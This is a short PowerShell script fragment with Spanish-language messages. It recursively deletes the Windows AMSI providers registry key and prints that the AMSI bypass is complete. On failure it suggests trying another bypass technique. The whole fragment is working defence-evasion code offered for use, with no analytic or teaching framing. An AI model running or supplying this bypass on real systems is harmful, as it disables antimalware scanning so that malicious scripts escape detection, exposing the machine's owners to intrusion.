
        Write-Host -ForegroundColor Yellow "Borrando clave del registro...";


        $path = 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers\'
        #$clave = Get-ChildItem $path -Name

        #Write-Host ("ruta completa: " +  $path + ($clave -as [String]))
        #Remove-Item -Path ($path + ($clave -as [String])) -Recurse
        try
        {
            Remove-Item -Path $path -Recurse
            Write-Host -ForegroundColor Yellow "[+] Bypass de AMSI completado";
        }
        catch
        {
            Write-host "Intente otra técnica para hacer el bypass de AMSI";
        }
        pause;
	    exit;
        

